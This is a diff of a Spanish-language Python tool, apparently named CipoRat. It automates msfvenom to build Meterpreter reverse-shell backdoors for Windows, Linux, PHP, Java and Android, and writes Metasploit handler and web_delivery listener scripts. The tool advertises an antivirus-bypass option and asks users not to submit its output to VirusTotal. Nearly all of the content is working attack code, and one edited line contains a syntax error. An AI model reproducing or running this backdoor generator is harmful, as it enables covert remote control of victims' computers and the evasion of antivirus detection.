@@ -1,4 +1,3 @@
-#!/usr/bin/python
 #Coding: UTF-8
 #@@Thanks for your help Null@@
 
@@ -44,8 +43,8 @@ def menu():
         #############################################################
 
     """)
-
-    print("Bienvenido a mi herramienta de libre uso.\n")
+    print("AVISO: CipoRat en windows está en acceso beta, por lo tanto pueden haber bugs\n")
+    print("Bienvenido a mi herramienta de código abierto.\n")
     print("1 - Backdoor con msfvenom")
     print("2 - Backdoor 100% indetectable (Antivirus Bypass) *En desarrollo*")
     print("3 - Información")
@@ -142,7 +141,7 @@ def funcion3():
     print("* El principal motivo de esta herramienta es facilitar el uso de metasploit\n")
     print("* Se ruega no subir los archivos a www.virustotal.com\n")
     print("* Si quieres ayudarme con este proyecto este es mi discord: CipoteMan#3436\n")
-    print("* Espero que te sirva de utilidad :D\n")
+    print("* Espero que le sirva de utilidad :D\n")
     print("")
     variable = input("Desea volver al menu principal? (s/n): ")
     if variable == "s":
@@ -175,7 +174,7 @@ def funcion5():
     payload = input("Inserte el payload: ")
     lhost = input("Inserte la ip o -dns (LHOST): ")
     lport = input("Inserte el puerto (LPORT): ")
-    f = open(r"cd C:\metasploit\listener.rc", "w+")
+    f = open(r"C:\metasploit\listener.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload {}\n".format(payload))
@@ -212,11 +211,11 @@ def opcion1():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     output = input("Que nombre le quieres dar al archivo?: ")
-    print("\nCreando exploit..., si todo sale correcto se exportará en tu escritorio.")
+    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
     os.system(r"cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o C:\Users\%USERNAME%\Desktop\{}.exe".format(lhost, lport, output))
     salir = input("Desea abrir el listener de metasploit? (s/n): ")
     os.system(r"cd C:\metasploit")
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload windows/meterpreter/reverse_tcp\n")
@@ -236,11 +235,11 @@ def opcion2():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     output = input("Que nombre le quieres dar al archivo?: ")
-    print("\nCreando exploit..., si todo sale correcto se exportará en tu escritorio.")
+    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
     os.system(r"cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_https lhost={} lport={} -f exe -o C:\Users\%USERNAME%\Desktop\{}.exe".format(lhost, lport, output))
     salir = input("Desea abrir el listener de metasploit? (s/n): ")
     os.system(r"cd C:\metasploit")
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload windows/meterpreter/reverse_https\n")
@@ -260,11 +259,11 @@ def opcion3():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     output = input("Que nombre le quieres dar al archivo?: ")
-    print("\nCreando exploit..., si todo sale correcto se exportará en tu escritorio.")
+    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
     os.system(r"cd C:\metasploit && msfvenom -p linux/x64/meterpreter/reverse_tcp lhost={} lport={} -f elf -o C:\Users\%USERNAME%\Desktop\{}.elf".format(lhost, lport, output))
     salir = input("Desea abrir el listener de metasploit? (s/n): ")
     os.system(r"cd C:\metasploit")
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload linux/x64/meterpreter/reverse_tcp\n")
@@ -284,11 +283,11 @@ def opcion4():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     output = input("Que nombre le quieres dar al archivo?: ")
-    print("\nCreando exploit..., si todo sale correcto se exportará en tu escritorio.")
+    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
     os.system(r"cd C:\metasploit && msfvenom -p linux/x64/meterpreter/reverse_https lhost={} lport={} -f elf -o C:\Users\%USERNAME%\Desktop\{}.elf".format(lhost, lport, output))
     salir = input("Desea abrir el listener de metasploit? (s/n): ")
     os.system(r"cd C:\metasploit")
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload linux/x64/meterpreter/reverse_https\n")
@@ -308,11 +307,11 @@ def opcion5():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     output = input("Que nombre le quieres dar al archivo?: ")
-    print("\nCreando exploit..., si todo sale correcto se exportará en tu escritorio.")
+    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
     os.system(r"cd C:\metasploit && msfvenom -p php/meterpreter/reverse_tcp lhost={} lport={} -f raw -o C:\Users\%USERNAME%\Desktop\{}.raw".format(lhost, lport, output))
     salir = input("Desea abrir el listener de metasploit? (s/n): ")
     os.system(r"cd C:\metasploit")
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload php/meterpreter/reverse_tcp\n")
@@ -332,11 +331,11 @@ def opcion6():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     output = input("Que nombre le quieres dar al archivo?: ")
-    print("\nCreando exploit..., si todo sale correcto se exportará en tu escritorio.")
+    print("Creando exploit..., si todo sale bien se exportará en tu escritorio.")
     os.system(r"cd C:\metasploit && msfvenom -p java/meterpreter/reverse_tcp lhost={} lport={} -f jar -o C:\Users\%USERNAME%\Desktop\{}.raw".format(lhost, lport, output))
     salir = input("Desea abrir el listener de metasploit? (s/n): ")
     os.system(r"cd C:\metasploit")
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload java/meterpreter/reverse_tcp\n")
@@ -357,10 +356,10 @@ def opcion7():
     lport = int(input("Escribe el puerto: "))
     output = input("Que nombre le quieres dar al archivo?: ")
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("\nCreando exploit...")
+    print("Creando exploit...")
     os.system("msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} -o {}.apk".format(lhost, lport, output))
     salir = input("Desea abrir el listener de metasploit? (s/n): ")
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/handler\n")
         f.write("set payload android/meterpreter/reverse_tcp\n")
@@ -380,7 +379,7 @@ def code1():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     os.system('cls' if os.name == 'nt' else 'clear')
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/script/web_delivery\n")
         f.write("set payload generic/shell_reverse_tcp\n")
@@ -401,7 +400,7 @@ def code2():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     os.system('cls' if os.name == 'nt' else 'clear')
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/script/web_delivery\n")
         f.write("set payload generic/shell_reverse_tcp\n")
@@ -410,7 +409,7 @@ def code2():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    print("\nGenerando código...\n")
+    print("Generando código...\n")
     time.sleep(5)
     os.system(r"cd C:\metasploit && console -r meta.rc")
 
@@ -422,7 +421,7 @@ def code3():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     os.system('cls' if os.name == 'nt' else 'clear')
-    f = open("meta.rc", "w+")
+    f = open(r"C:\metasploit\meta.rc", "w+"")
     for i in range(1):
         f.write("use exploit/multi/script/web_delivery\n")
         f.write("set payload python/meterpreter_reverse_tcp\n")
@@ -431,7 +430,7 @@ def code3():
         f.write("set lport {}\n".format(lport))
         f.write("exploit")
         f.close()
-    print("\nGenerando código...\n")
+    print("Generando código...\n")
     time.sleep(5)
     os.system(r"cd C:\metasploit && console -r meta.rc")
 
